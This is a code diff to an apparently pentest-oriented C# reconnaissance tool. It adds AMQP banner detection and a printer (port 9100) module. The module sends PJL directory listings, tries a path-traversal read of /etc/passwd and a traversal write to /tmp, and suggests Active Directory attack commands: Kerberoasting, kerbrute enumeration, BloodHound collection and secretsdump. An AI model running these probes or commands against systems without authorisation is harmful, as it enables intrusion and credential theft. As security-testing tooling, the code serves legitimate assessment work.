@@ -290,16 +290,7 @@ namespace Reecon
                 .ToList();
 
             string unknownPortResult = "";
-
-            // No entries at all
-            if (bannerList.Count == 0)
-            {
-                unknownPortResult += $"Port {port} - Empty".Recolor(Color.Green);
-                Console.WriteLine(unknownPortResult + Environment.NewLine + "- No Response" + Environment.NewLine);
-                return "";
-            }
-
-            // Intentionally closed 
+            
             foreach (List<byte> bannerBytes in bannerList)
             {
                 string bannerString = Encoding.UTF8.GetString(bannerBytes.ToArray());
@@ -568,9 +559,90 @@ namespace Reecon
                     Console.WriteLine(unknownPortResult);
                 }
             }
-            // 47538/tcp open  socks-proxy Socks4A
-            // -> [?? _ ??
+            
+            // Some special cases for specific ports
+            
+            // 5672 needs refactoring
+            if (port == 5672)
+            {
+                string portHeader = "Port 5672 - Advanced Message Queuing Protocol (AMQP)";
+                string portData = General.BannerGrab(target, 5672, "Woof" + Environment.NewLine + Environment.NewLine);
+                if (portData.StartsWith("AMQP"))
+                {
+                    if (portData[4] == 0 && portData[5] == 0 && portData[6] == 9 && portData[7] == 1)
+                    {
+                        portData = "- Version 0-9-1";
+                        // theBanner = General.BannerGrab(ip, port, theBanner); // Need to send the bytes of AMQP0091
 
+                        // Oh gawd....
+                        // \u0001\0\0\0\0\u0001?\0\n\0\n\0\t\0\0\u0001?\fcapabilitiesF\0\0\0?\u0012publisher_confirmst\u0001\u001aexchange_exchange_bindingst\u0001\nbasic.nackt\u0001\u0016consumer_cancel_notifyt\u0001\u0012connection.blockedt\u0001\u0013consumer_prioritiest\u0001\u001cauthentication_failure_closet\u0001\u0010per_consumer_qost\u0001\u000fdirect_reply_tot\u0001\fcluster_nameS\0\0\0\u0010rabbit@dyplesher\tcopyrightS\0\0\0.Copyright (C) 2007-2018 Pivotal Software, Inc.\vinformationS\0\0\05Licensed under the MPL.  See http://www.rabbitmq.com/\bplatformS\0\0\0\u0011Erlang/OTP 22.0.7\aproductS\0\0\0\bRabbitMQ\aversionS\0\0\0\u00053.7.8\0\0\0\u000ePLAIN AMQPLAIN\0\0\0\u0005en_US?
+                        // https://svn.nmap.org/nmap/nselib/amqp.lua
+                        postScanActions += $"- AMQP is up and nmap knows more: nmap --script amqp-info -p{port} {target}" + Environment.NewLine;
+                    }
+                    else
+                    {
+                        portData = "- 5672.Unknown Version - Bug Reelix";
+                    }
+                }
+                else
+                {
+                    portData = "- 5672.Unknown - Bug Reelix";
+                }
+                Console.WriteLine(portHeader + Environment.NewLine + portData + Environment.NewLine);
+            }
+            else if (port == 9100)
+            {
+                // Console.WriteLine(unknownPortResult + Environment.NewLine + portInfo.PortData + Environment.NewLine);
+                // TODO: Clean - Should the file be named "Printer.cs" or "jetdirect.cs" ???
+                unknownPortResult = $"Port {port} - Printer (jetdirect)".Recolor(Color.Green) + Environment.NewLine;
+
+                // PJL
+
+                // http://hacking-printers.net/wiki/index.php/Printer_Security_Testing_Cheat_Sheet
+                // Yoinked from Nmap
+                string bannerInfo = General.BannerGrab(target, port, "@PJL INFO ID\r\n");
+                if (bannerInfo != "")
+                {
+                    unknownPortResult += "- Version: " + bannerInfo + Environment.NewLine;
+                    // Yoinked from PRET
+                    List<string> dirList = General.BannerGrab(target, port, "@PJL FSDIRLIST NAME=\"0:/\" ENTRY=1 COUNT=65535\r\n", timeout: 5).Split("\r\n".ToCharArray()).ToList();
+                    // Clean new lines
+                    dirList.RemoveAll(string.IsNullOrEmpty);
+                    // Append each item
+                    unknownPortResult += "- Directory List: " + Environment.NewLine;
+                    foreach (string dir in dirList)
+                    {
+                        unknownPortResult += "-- " + dir + Environment.NewLine;
+                    }
+                    
+                    // Test a rest of /etc/passwd (With some traversal)
+                    List<string> readTest = General.BannerGrab(target, port, "@PJL FSUPLOAD NAME=\"0:/../../../../../../../../etc/passwd\" SIZE=99999\r\n").Split("\r\n".ToCharArray()).ToList(); readTest.RemoveAll(string.IsNullOrEmpty);
+                    if (readTest.Any())
+                    {
+                        unknownPortResult += "- " + "Partial read of 0:/../../../../../../../../etc/passwd - Successful!".Recolor(Color.Green) + Environment.NewLine;
+                        foreach (string line in readTest)
+                        {
+                            unknownPortResult += "-- " + line + Environment.NewLine;
+                        }
+                    }
+                    
+                    // Test write
+                    General.BannerGrab(target, port, "@PJL FSDOWNLOAD NAME=\"0:/../../../../../../tmp/reecon\" SIZE=99999\nThis is a test");
+                    readTest = General.BannerGrab(target, port, "@PJL FSUPLOAD NAME=\"0:/../../../../../../../../tmp/reecon\" SIZE=99999\r\n").Split("\r\n".ToCharArray()).ToList();
+                    if (readTest.Contains("This is a test"))
+                    {
+                        unknownPortResult += "- " + "Write of 0:/../../../../../../../../tmp/reecon - Successful!!!".Recolor(Color.Green) + Environment.NewLine;
+                    }
+
+                    // PFL Successful - Add pjl to the post scan actions
+                    postScanActions += Environment.NewLine + $"- Printer: pret.py {target} pjl ( https://github.com/RUB-NDS/PRET )" + Environment.NewLine;
+                    // If I need to do more PRET stuff, I can refer to this video
+                    postScanActions += "-- Ref: https://www.youtube.com/watch?v=vD3jSJlc0ro" + Environment.NewLine;
+                }
+                // TODO: Add PCL (Printer Command Language), XEX, IPDS
+                Console.WriteLine(unknownPortResult);
+            }
+            
             // It's gone through everything and there's still no regular results
             if (unknownPortResult == "")
             {
@@ -704,7 +776,7 @@ namespace Reecon
                     }
 
                     // Bloodhound Collection
-                    postScanActions += $"- LDAP - Bloodhound Collection: nxc ldap {target} -u 'USERNAME' -p 'PASSWORD' --bloodhound --collection All --dns-server {target}" + Environment.NewLine;
+                    postScanActions += $"- LDAP - Bloodhound Collection: bloodyAD --host {target} -d {target} -u 'USER' -p 'PASSWORD' get bloodhound" + Environment.NewLine;
 
                     // Username enum
                     postScanActions += $"- Kerberos Username Enum: kerbrute userenum --dc {target} -d {defaultNamingContext} users.txt (Very very fast - Use xato and wait 10 minutes)" + Environment.NewLine;
@@ -723,7 +795,7 @@ namespace Reecon
                     postScanActions += $"- Guest Kerberoasting: nxc ldap {defaultNamingContext} -u 'guest' -p '' --kerberoasting kerberoastables.txt" + Environment.NewLine;
 
                     // Writables (Because Bloodhound misses it ._.)
-                    postScanActions += $" - Get Writables: bloodyAD --host {defaultNamingContext} -d {defaultNamingContext} -u username -p 'password' get writable" + Environment.NewLine;
+                    postScanActions += $"- Get Writables: bloodyAD --host {defaultNamingContext} -d {defaultNamingContext} -u username -p 'password' get writable" + Environment.NewLine;
                     
                     // Post exploitation
                     postScanActions += $"- If you get details: python3 secretsdump.py usernameHere:\"passwordHere\"@{target} | grep :" + Environment.NewLine;
@@ -889,7 +961,7 @@ namespace Reecon
                 {
                     portData += "- Version: " + bannerInfo + Environment.NewLine;
                     // Yoinked from PRET
-                    List<string> dirList = General.BannerGrab(target, port, "@PJL FSDIRLIST NAME=\"0:/ \" ENTRY=1 COUNT=65535\r\n").Split("\r\n".ToCharArray()).ToList();
+                    List<string> dirList = General.BannerGrab(target, port, "@PJL FSDIRLIST NAME=\"0:/\" ENTRY=1 COUNT=65535\r\n").Split("\r\n".ToCharArray()).ToList();
                     // Clean new lines
                     dirList.RemoveAll(string.IsNullOrEmpty);
                     // Append each item
